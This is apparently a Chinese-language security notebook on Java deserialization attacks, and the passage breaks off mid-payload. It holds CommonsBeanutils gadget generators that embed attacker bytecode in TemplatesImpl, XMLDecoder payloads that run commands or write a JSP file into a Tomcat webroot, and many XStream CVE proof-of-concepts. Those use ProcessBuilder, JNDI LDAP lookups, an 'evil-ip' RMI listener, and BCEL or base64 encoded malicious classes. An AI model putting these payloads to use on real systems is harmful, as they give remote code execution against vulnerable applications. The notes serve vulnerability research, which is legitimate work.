有参构造可参考需要的参数, 这两个类需要的参数是相同的 AttrNSImpl(CoreDocumentImpl ownerDocument, String namespaceURI, String qualifiedName, String localName) POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.*; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils2_AttrComparator { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); // 需要带参数且继承Attr接口 AttrNSImpl 有参构造 AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(), \"1\", \"1\", \"1\"); // PSVIAttrNSImpl 有参构造 PSVIAttrNSImpl psviAttrNS = new PSVIAttrNSImpl(new CoreDocumentImpl(), \"1\", \"1\", \"1\"); /**使用AttrComparator类*/ final BeanComparator beanComparator = new BeanComparator(null, new AttrCompare()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(psviAttrNS);priorityQueue.add(psviAttrNS); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } 还有一些可用的Comparabtor是建立在依赖的基础上 org.apache.commons.lang3.compare.ObjectToStringComparator org.apache.commons commons-lang3 3.12.0 ↓↓↓ // ObjectToStringComparator stringComparator = new ObjectToStringComparator(); final BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); org.apache.logging.log4j.util.PropertySource org.apache.logging.log4j log4j-api 2.13.3 ↓↓↓ /**使用PropertySource.Comparator类*/ final PropertySource propertySource = new PropertySource() { public int getPriority() { return 0; } }; final BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(propertySource);priorityQueue.add(propertySource); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); ObjectToStringComparator 依赖 org.apache.commons commons-lang3 3.12.0 POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.AttrNSImpl; import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl; import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare; import org.apache.commons.beanutils.BeanComparator; /** * * org.apache.commons * commons-lang3 * 3.12.0 * * */ import org.apache.commons.lang3.compare.ObjectToStringComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils2_ObjectToStringComparator { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); /**使用ObjectToStringComparator类*/ // ObjectToStringComparator stringComparator = new ObjectToStringComparator(); final BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(\"1\");priorityQueue.add(\"2\"); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } PropertySource org.apache.logging.log4j log4j-api 2.13.3 POC package CommonsBeanutils; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xerces.internal.dom.AttrNSImpl; import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl; import org.apache.commons.beanutils.BeanComparator; import org.apache.logging.log4j.util.PropertySource; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils2_PropertySource { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"EvilTemplatesImpl\"); setFieldValue(templates, \"_class\", null); AttrNSImpl attrNS1 = new AttrNSImpl(); CoreDocumentImpl coreDocument = new CoreDocumentImpl(); attrNS1.setValues(coreDocument, \"1\", \"1\", \"1\"); /**使用PropertySource.Comparator类*/ final PropertySource propertySource = new PropertySource() { public int getPriority() { return 0; } }; final BeanComparator beanComparator = new BeanComparator(null, new PropertySource.Comparator()); final PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator); // stub data for replacement later priorityQueue.add(propertySource);priorityQueue.add(propertySource); /**换用继承会触发一些顺序上的问题*/ setFieldValue(beanComparator, \"property\", \"outputProperties\"); setFieldValue(priorityQueue, \"queue\", new Object[]{templates, templates}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(priorityQueue); oos.close(); return barr.toByteArray(); } } "},"javanote/Java XML反序列化漏洞.html":{"url":"javanote/Java XML反序列化漏洞.html","title":"Java XML反序列化漏洞","keywords":"","body":"Java XML反序列化漏洞 例举出几个几个 XML 和 YAML 的反序列化漏洞。 XMLDecoder XStream SnakeYaml 在我遇到的项目里，这三个依赖库最常见。 其中 XMLDecoder 不同于其他几个，这个更像是反射漏洞，虽然本质上都是可以反序列化回序列化的数据，但 XMLDecoder 和 XStream 可以自由的控制类、方法、参数，SnakeYaml 一类就同 Jackson 和 fastjson 一样，本质上是调用了 get、set 和构造方法。 weblogic debug Reference: https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html https://blog.csdn.net/Munch_D_Rudy/article/details/122459667 debug点在test\\weblogic.jar!\\weblogic\\wsee\\jaxws\\WLSServletAdapter.class:129 最后访问该网址测试是否debug http://localhost:7001/wls-wsat/CoordinatorPortType XMLDecoder Encode import java.beans.XMLEncoder; import java.util.ArrayList; import java.util.HashMap; public class Encode { public static void main(String[] args){ HashMap map = new HashMap<>(); map.put(\"123\", \"hhh\"); map.put(\"321\", new ArrayList<>()); XMLEncoder xmlEncoder = new XMLEncoder(System.out); xmlEncoder.writeObject(map); xmlEncoder.close(); } } 会得到一段用 XMLEncoder 生成 hashmap 对象 xml 的代码 123 hhh 321 再拿这个生成的xml，用XMLDecoder解析 import java.beans.XMLDecoder; import java.beans.XMLEncoder; import java.io.StringBufferInputStream; import java.util.ArrayList; import java.util.HashMap; public class Decode { public static void main(String[] args){ String s = \"\\n\" + \"\\n\" + \" \\n\" + \" \\n\" + \" 123\\n\" + \" hhh\\n\" + \" \\n\" + \" \\n\" + \" 321\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \"\"; StringBufferInputStream stringBufferInputStream = new StringBufferInputStream(s); XMLDecoder xmlDecoder = new XMLDecoder(stringBufferInputStream); Object o = xmlDecoder.readObject(); System.out.println(o); } } 成功把刚才的map对象给反序列化回来了 {123=hhh, 321=[]} 可以根据其写法去执行代码 calc.exe 相当于执行了 new java.lang.ProcessBuilder(new String[]{\"calc\"}).start(); 然后可以根据weblogic XMLDecoder的一些payload推断执行的代码 /usr/local/tomcat/webapps/ROOT/static/ricky.jsp 相当于执行了 java.io.PrintWriter x = new java.io.PrintWriter(\"/usr/local/tomcat/webapps/ROOT/static/ricky.jsp\"); x.println(\"ricky\"); x.close(); 流程分析 整体流程 XMLDecoder.readObject() XMLDecoder.parsingCompelete() DocumentHandler.parse() SAXParserFactory.newInstance().newSAXParser().parse() xmlReader.parse() XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的, DocumentHandler类是XMLDecoder反序列化漏洞的根源类 通过readObject进入parsingComplete private boolean parsingComplete() { if (this.input == null) { return false; } if (this.array == null) { if ((this.acc == null) && (null != System.getSecurityManager())) { throw new SecurityException(\"AccessControlContext is not set\"); } AccessController.doPrivileged(new PrivilegedAction() { public Void run() { XMLDecoder.this.handler.parse(XMLDecoder.this.input); return null; } }, this.acc); this.array = this.handler.getObjects(); } return true; } 接着调用XMLDecoder.this.handler.parse方法, 默认的handler private final DocumentHandler handler = new DocumentHandler(); 于是跟进DocumentHandler#parse public void parse(final InputSource var1) { if (this.acc == null && null != System.getSecurityManager()) { throw new SecurityException(\"AccessControlContext is not set\"); } else { AccessControlContext var2 = AccessController.getContext(); SharedSecrets.getJavaSecurityAccess().doIntersectionPrivilege(new PrivilegedAction() { public Void run() { try { SAXParserFactory.newInstance().newSAXParser().parse(var1, DocumentHandler.this); } catch (ParserConfigurationException var3) { DocumentHandler.this.handleException(var3); } catch (SAXException var4) { Object var2 = var4.getException(); if (var2 == null) { var2 = var4; } DocumentHandler.this.handleException((Exception)var2); } catch (IOException var5) { DocumentHandler.this.handleException(var5); } return null; } }, var2, this.acc); } } 跟进 SAXParserFactory.newInstance().newSAXParser().parse, 一开始是通过 SAXParserFactory.newInstance() 创建了一个 SAXParserFactoryImpl 实例, 调用其 newSAXParser 方法 public SAXParser newSAXParser() throws ParserConfigurationException { SAXParser saxParserImpl; try { saxParserImpl = new SAXParserImpl(this, features, fSecureProcess); } catch (SAXException se) { // Translate to ParserConfigurationException throw new ParserConfigurationException(se.getMessage()); } return saxParserImpl; } 很明显, 返回的是一个 SAXParserImpl 实例, 于是跟进 SAXParserImpl#parse public void parse(InputSource is, DefaultHandler dh) throws SAXException, IOException { if (is == null) { throw new IllegalArgumentException(); } if (dh != null) { xmlReader.setContentHandler(dh); xmlReader.setEntityResolver(dh); xmlReader.setErrorHandler(dh); xmlReader.setDTDHandler(dh); xmlReader.setDocumentHandler(null); } xmlReader.parse(is); } 继续跟进 SAXParserImpl#parse public void parse(InputSource inputSource) throws SAXException, IOException { if (fSAXParser != null && fSAXParser.fSchemaValidator != null) { if (fSAXParser.fSchemaValidationManager != null) { fSAXParser.fSchemaValidationManager.reset(); fSAXParser.fUnparsedEntityHandler.reset(); } resetSchemaValidator(); } super.parse(inputSource); } 跟进AbstractSAXParser#parse后再跟进XMLParser#parse, 然后往下走会来到XML11Configuration#parse public boolean parse(boolean complete) throws XNIException, IOException { // // reset and configure pipeline and set InputSource. if (fInputSource != null) { try { fValidationManager.reset(); fVersionDetector.reset(this); fConfigUpdated = true; resetCommon(); short version = fVersionDetector.determineDocVersion(fInputSource); if (version == Constants.XML_VERSION_1_1) { initXML11Components(); configureXML11Pipeline(); resetXML11(); } else { configurePipeline(); reset(); } // mark configuration as fixed fConfigUpdated = false; // resets and sets the pipeline. fVersionDetector.startDocumentParsing((XMLEntityHandler) fCurrentScanner, version); fInputSource = null; } catch (XNIException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (IOException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (RuntimeException ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw ex; } catch (Exception ex) { if (PRINT_EXCEPTION_STACK_TRACE) ex.printStackTrace(); throw new XNIException(ex); } } determineDocVersion()主要获取XML实体扫描器然后扫描解析 来获取XML文档的版本信息 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为\"[xml]\"、DTD的伪名称为\"[dtd]\"、参数实体名称以\"%\"开头；接着函数内部会调用startDocument()函数开始准备文件扫描）, 最后会到 ObjectElementHandler#getValueObject 创建实例 最后解析到void标签获取到start方法，然后通过调用start方法实现了命令执行 XStream XStream 和 XMLDecoder 差不多，都是 Java 对象和 XML 互转的库，在审计java项目时也经常能见到。比较出名的几个项目 Bamboo 、Struts2 、Jenkins 都有用到它，且曝出过漏洞。 XStream 有几个 CVE ，分别是 RCE、XXE、DOS。 XXE 影响 1.4.8 及之前版本 com.thoughtworks.xstream.io.xml.DomDriver domDriver = new com.thoughtworks.xstream.io.xml.DomDriver(); String x = \"\\n\" + \"\\n\" + \"%xxe;]>\\n\" + \"1\"; domDriver.createReader(new StringReader(x)); 漏洞参考 http://x-stream.github.io/CVE-2016-3674.html DOS 影响 1.4.9 及之前版本 XStream xstream = new XStream(); xstream.fromXML(\"\"); xstream.fromXML(\"Hello, world!\"); RCE 它的 CVE 编号是 CVE-2013-7285，可以影响到 1.4.10 版本。还有 CVE-2019-10173。 1.4.10 版本更新的时候加了一个通过 XStream.setupDefaultSecurity 方法初始化安全框架的功能。但默认不被调用，依然可以攻击 1.4.10 版本的 XStream。 import com.thoughtworks.xstream.XStream; public class xstream { public static void main(String[] args) { XStream xstream = new XStream(); String x = \"\\n\" + \" \\n\" + \" java.lang.Comparable\\n\" + \" \\n\" + \" \\n\" + \" \\n\" + \" calc.exe\\n\" + \" \\n\" + \" \\n\" + \" start\\n\" + \" \\n\" + \" \\n\" + \"\"; xstream.fromXML(x); } } 反序列化利用工具 marshalsec 里就可以生成 XStream 的很多 gadgets CommonsConfiguration Rome CommonsBeanutils ServiceLoader ImageIO BindingEnumeration LazySearchEnumeration SpringAbstractBeanFactoryPointcutAdvisor SpringPartiallyComparableAdvisorHolder Resin XBean 实现的这些接口都是可以生成的 gadgets Xstream反序列化 参考: https://www.anquanke.com/post/id/204314 https://blog.szfszf.top/article/52/ https://blog.0kami.cn/2020/04/18/java/talk-about-xstream-deserialization/ XStream的序列化和反序列化主要依靠toXML函数和fromXML函数 关于XStream的fromXML分析参考这篇文章 XStream反序列化和fastjson不一样的地方是fastjson会在反序列化的时候主动去调用getters和setters，而XStream的反序列化过程中赋值都有Java的反射机制来完成，所以并没有这样主动调用的特性。 MapConverter 针对Map类型还原的Converter com.thoughtworks.xstream.converters.collections.MapConverter#unmarshal populateMap函数会去处理后续的值，直接来看具体put的地方 com.thoughtworks.xstream.converters.collections.MapConverter#putCurrentEntryIntoMap 这里target作为接收者，会调用Map的put函数，后续就是对key调用hashCode函数 TreeSet/TreeMapConverter 这里TreeSet和TreeMap放一起，因为TreeSet本身就是一个只用上了Key的TreeMap；TreeSetConverter的反序列化处理也是先转化为TreeMapConverter的方式来优先还原TreeSet里的TreeMap，再填充到TreeSet里。 从TreeSetConverter开始 从Treeset中取出field treemap后，去进一步调用TreeMapConverter来还原TreeMap com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap 这里先用soredMap来填充需要还原的Entry，后续将调用TreeMap.putAll 最终会调用到java.util.AbstractMap#putAll 这里的put函数为TreeMap.put , 它的主要功能就是填充数据，并且在填充时将会比较当前存在key，如果是相同的key，则替换原有老的值。这个过程会去调用key的compareTo函数 DynamicProxyConverter XStream还支持对动态代理的方式进行还原 主要的关注点是使用Proxy动态代理, 可以扩展前面两种的自动调用函数的攻击面 结合上面基础知识中提到的几个Converter，我们想要利用XStream反序列化漏洞的话，得去充分利用前面提到的几个会自动调用的函数 EventHandler XStream反序列化用的最多的EventHandler，来看看它的invoke函数 首先需要判断此时调用的函数是否为hashCode、equals、toString，如果是的话，采用以下的方式来处理。 if (methodName.equals(\"hashCode\")) { return new Integer(System.identityHashCode(proxy)); } else if (methodName.equals(\"equals\")) { return (proxy == arguments[0] ? Boolean.TRUE : Boolean.FALSE); } else if (methodName.equals(\"toString\")) { return proxy.getClass().getName() + '@' + Integer.toHexString(proxy.hashCode()); } 需要利用的是invokeInternal函数后续的部分，所以我们利用的时候不能用它来调用上面的3个函数，意味着前面提到的Map的方式，不适合用在这个地方；而TreeSet这种调用compareTo函数，可以用来继续往下走。 后续的就是java反射机制来实现函数调用, 并且这里的target和action都是可控的。 此处action函数参数是有要求的: 无参数 单个参数，且参数的类型为Comparable，并且这个action函数是可利用的 第2种暂时未出现, 可以利用第一种方法: 配置好cmd的ProcessBuilder，action填start 配置好rmi url的JdbcRowSetImpl，action填getDatabaseMetaData，主要思路就是可利用的getters TreeSet POC1 java.lang.Comparable calc.exe start POC2 java.lang.Comparable ldap://127.0.0.1:1099/calc getDatabaseMetaData 也就是把dataSource在父类javax.sql.rowset.BaseRowSet默认赋值后调用子类com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData触发JNDI注入, 完整的写法会比这个复杂, 原因是把所有的默认值都生成了 POC3 java.lang.Comparable 1008 true 1000 0 2 0 0 0 true 1004 false ldap://127.0.0.1:1099/calc -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 getDatabaseMetaData TreeMap POC4 java.lang.Comparable calc.exe false start ricky POC5 java.lang.Comparable ldap://127.0.0.1:1099/calc getDatabaseMetaData ricky Groovy ConvertedClosure 利用环境：groovy MethodClosure不允许反序列化调用 MethodClosure 当前MethodClosure的主要作用就是封装我们需要执行的对象，比如 new MethodClosure(Runtime.getRuntime(), \"exec\"); 封装Runtime对象，并设定后续需要调用的函数exec ConvertedClosure 这个ConvertedClosure也是继承了InvocationHandler，可以在动态代理中作为handler的存在，来看一下他的invoke ConvertedClosure 调用的是父类org.codehaus.groovy.runtime.ConversionHandler#invoke 主要看这个部分，对于当前调用的函数，如果非Object的函数(如toString、hashCode等)，并且不是GroovyObject的函数，会去调用子类的invokeCustom，这里看org.codehaus.groovy.runtime.ConvertedClosure#invokeCustom 这里的属性都是可控的，也就意味着我们可以去调用去调用前面构造好的MethodClosure 参考: https://paper.seebug.org/1171/ compareTo会带上一个参数，所以我们MethodClosure封装的后续需要调用的函数必须要存在一个String类型的参数，不然会找不到函数报错, 直接构造Runtime.exec可以解决这个问题 calc java.lang.Comparable exec compareTo Groovy Expando 这里使用Map的类型来触发。以Map的类型来触发，那就是找可以利用的hashCode函数 groovy.util.Expando#hashCode 如果在类属性expandoProperties中存在hashCode:methodclosure的内容，我们可以在这里直接调用MethodClosure的call函数，跟上面ConvertedClosure后续的调用一样，但是这里调用时没有函数参数过来，所以这里的思路是ProcessBuilder.start或者fastjson那种getters的利用 hashCode calc.exe false 0 0 0 start ricky groovy String execute() method (sample: \"calc.exe\".execute()) hashCode calc.exe calc.exe execute ImageIO$ContainsFilter(CVE-2020-26217) 这条链利用的也是HashMap自动调用hashCode方法的触发点 POC 0 false 0 calc.exe false java.lang.ProcessBuilder start foo foo false 0 0 false false 0 ServiceLoader$LazyIterator 在java.util.ServiceLoader$LazyIterator类的next方法中会调用Class.forName, 其中ClassName和loader都可控，可以利用以前BCEL的classLoader会把className内容当字节码加载的gadget实现getshell。 虽然Class.forName的第二个参数为false无法加载类的静态块，但是在后续实例化了这个类，所以可以在无参构造函数里插入恶意代码。 修改BCEL ClassLoader构造POC 这里来提一下关于POC的构造，如果你使用了当前这个利用链，并且不对ClassLoader做处理的话，你会发现怎么都打不通，因为这里在实际还原ClassLoader的时候出现了错误 这里有两种解决方案，一是去除这种还原有问题的类（会很麻烦），二是直接把ClassLoader里的一些无关紧要的东西剔除掉。 这里我选择了第二种，经过调试去除了以下几个属性的值 这里由于我们剔除了ignored_packages和deferTo，导致BCEL的ClassLoader在载入普通的类的时候会出现加载错误的问题 来看看怎么解决这个问题 首先BCEL的ClassLoader.loadClass，一共尝试4次不同的载入方法 从当前ClassLoader的classes去找 对于默认忽略的包java./sun./javax.，使用deferTo去重新加载，这里的deferTo是系统的ClassLoader（ClassLoader.getSystemClassLoader()) 对于classname以$$BCEL$$开头的，根据classname的值去defineClass，这边就是我们最喜欢的任意载入字节码的地方 最后一次是用repository去载入当前的classname，如果这里还没找到，就会爆没有找到Class的错误 PS：这部分repository取的SyntheticRepository.getInstance()，还不是很清楚这个左右，后续整理一下ClassLoader相关的知识再做补充 再来看我们报错的原因，因为删除ignored_packages和deferTo之后，相当于第二种情况无法载入了，而显然java.lang.Object不符合第三种情况。最后第4种里面也没有找到这个java.lang.Object，所以最终爆了ClassNotFoundException 这里其实已经很明显了，解决这个问题，我们得在classes里添加我们传入的class字节码里所用到的所有类，那么在第一次尝试载入的时候，就找到了相应的类，无需尝试后续的几种载入方式。 比如这里我产生的字节码里面用上了Runtime，就得加上这个类 这里的Object必须加上，毕竟所有的对象都继承自Object 测试后发现报错提示找不到的类还是需要添加, 基本的命令执行需要以下四个类 java.lang.Object java.lang.Runtime java.lang.Throwable java.lang.Exception POC 0 false 0 java.lang.Object false false false java.lang.Object java.lang.Object java.lang.Runtime java.lang.Runtime java.lang.Throwable java.lang.Throwable java.lang.Exception java.lang.Exception $$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$c2P$Q$3d$X$K$z$b5$3cD$f1$fd$7e$C$LY$b8$d4$b8$d0$e0$c6$fa$88$Y$5c_$ae7x$b5$b6$a4$5c$88$7f$e4$da$8d$g$X$7e$80$le$9c$d6$H$gm$d2$99$ce$993g$ce$a4$afo$cf$_$A6$b1f$c3$c2$b8$8d$JLZ$98$8a$f2$b4$89$Z$h$v$cc$9a$9831$cf$90$deV$be$d2$3b$M$c9r$a5$c9$60$ec$F$X$92$n$ef$w_$k$f5nZ2$3c$e3$z$8f$90$a2$h$I$ee5y$a8$a2$fa$T4$f4$a5$ea2$U$dc$9eV$5e$b7V$ef$xow$af$een1X$db$c2$fb$UfD$y$b9W$bc$cfk$k$f7$db$b5$fa$ad$90$j$ad$C$9fh$d9$86$e6$e2$fa$90wbA$f2$c6$607$82$5e$u$e4$be$8a$Wd$bf$q7$a2y$H$Z$d8$s$W$i$yb$89v$90$n$b1$no$a5$83e$ac0$8c$fc$b3$c3$c1$wl$86$dco$83dy$c0$3dn$5dI$a1$Z$86$H$d0i$cf$d7$ea$86$f6$dbm$a9$bf$8bR$b9$e2$fe$e1$d0$R$GY$Q$M$eb$e5$l$dd$86$O$95$df$de$fa9p$S$GBv$bb4$90$efPS$c7$a7$9f$85$5cH$3a$c7$a4$l$V$3d$J$b0$e8H$8aCT$d5$u3$ca$a9$ea$p$d8$7d$dcv$u$a6c0$89$yE$e7$83$80$i$f2$94$z$U$be$87y$y$G$U$9f$90$u$s$l$60$9c$df$c1$3a$a8$3e$m$7d$l$e3$Z$9aM$91J$a48F_$91n$sFMR$b60LJ_$h$b20$a8$$R5B$af$89$84kb$d4$a0F$v65$f6$O$ff8$d8$efr$C$A$A false 0 0 false false 0 CVE-2021-21344 从PriorityQueue的readObject调用compare作为入口点，直到com.sun.xml.internal.bind.v2.runtime.reflect.Accessor.GetterSetterReflection的get方法进行了反射调用。关键点在于Accessor.GetterSetterReflection类虽然未实现Serializable接口，但是仍然可以反序列化使用。下图就是最后利用ProcessBuilder.start执行命令的链 POC1 2 java.lang.ProcessBuilder java.lang.ProcessBuilder start true 1 UTF-8 calc.exe 3 javax.xml.ws.binding.attachments.inbound javax.xml.ws.binding.attachments.inbound CVE-2021-21345 在CVE-2021-21344的基础上不采用JdbcRowSetImpl而是使用com.sun.corba.se.impl.activation.ServerTableEntry类直接在本地执行恶意代码, 在 ServerTableEntry 类的 verify 方法上 public int verify() { try { if (debug) System.out.println(\"Server being verified w/\" + activationCmd); process = Runtime.getRuntime().exec(activationCmd); int result = process.waitFor(); if (debug) printDebug( \"verify\", \"returns \" + ServerMain.printResult( result ) ) ; return result ; } catch (Exception e) { if (debug) printDebug( \"verify\", \"returns unknown error because of exception \" + e ) ; return ServerMain.UNKNOWN_ERROR; } } 控制 activationCmd 的值即可命令执行 2 com.sun.corba.se.impl.activation.ServerTableEntry com.sun.corba.se.impl.activation.ServerTableEntry verify true 1 UTF-8 calc.exe 3 javax.xml.ws.binding.attachments.inbound javax.xml.ws.binding.attachments.inbound CVE-2021-21346 通过TreeMap的put方法调用Rdn$RdnEntry的compareTo方法 再通过value.equals 触发 XString 的 equals 方法, that.value 赋值为 MultiUIDefaults 实例, 触发其 toString 方法 通过当中buf.append(key + \"=\" + get(key) + \", \");触发其get方法, get方法中通过Object value = super.get(key);调用UIDefaults的get方法, 经过Object value = getFromHashtable( key );调用其getFromHashtable方法 跟进发现其value值的定义影响 if (value instanceof LazyValue) { try { /* If an exception is thrown we'll just put the LazyValue * back in the table. */ value = ((LazyValue)value).createValue(this); } 设置为我们需要的SwingLazyValue触发其createValue方法, 其中先是获取方法而后对其调用 Object[] 类型不能强制转换为 String 类型导致无法通过此链进行命令执行 su18 0.75 525 700 0 en_US 0.75 525 700 1 lazyValue javax.naming.InitialContext doLookup ldap://127.0.0.1:1099/calc su18 test CVE-2021-21347 参考: https://paper.seebug.org/1543/#3-cve-2021-21347 https://x-stream.github.io/CVE-2021-21347.html 在 jdk1.8.221 可以完美复现, 调用苛刻就不再多说了 CVE-2021-21350 BCEL调用, POC可参考:https://x-stream.github.io/CVE-2021-21350.html CVE-2021-21351 这个标签在低版本的jdk中是没有的, 需要更换为, 如果是高版本调用则无需更换 ysomap -10086 false false false false false 1008 true 1000 0 2 0 0 0 true 1004 false ldap://127.0.0.1:1099/calc com.sun.rowset.JdbcRowSetImpl setAutoCommit boolean false false false -1 false false 1 1 false ysomap test CVE-2021-29505 POC 2 3 12345 com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content 12345 true SOAP_11 false aa aa UnicastRef 127.0.0.1 1099 0 0 0 0 false evil-ip 1099 JRMPListener在1099开启RMI服务即可恶意加载类 CVE-2021-39139 JDK7u21 RCE,可替换为 0 -1 yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAxMdXRpbHMvRXZpbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAkACgcALgwALwAwAQAIY2FsYy5leGUMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEACnV0aWxzL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAsADQAAAAwAAQAAAAUADgAPAAAAAQAQABEAAgALAAAAPwAAAAMAAA